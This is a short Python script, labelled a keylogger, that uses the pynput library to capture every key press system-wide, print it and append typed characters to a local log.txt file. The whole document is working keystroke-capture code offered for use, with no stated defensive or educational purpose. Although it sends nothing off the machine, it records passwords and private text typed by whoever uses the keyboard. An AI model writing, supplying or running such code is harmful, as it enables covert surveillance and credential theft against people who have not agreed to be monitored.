#Main keylogger

#Import Modules
import pynput
from pynput import keyboard

#Function to log key presses
def Keypress(key):
    print(str(key))
    with open("log.txt", "a") as logKey:   #Open log file to write
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error logging key")   #If this is shown, it means the key is not a character (space, enter, etc.)

#Main function (Used to listen)        
if __name__ == "__main__":
    listner = keyboard.Listener(on_press=Keypress)
    listner.start()
    input()

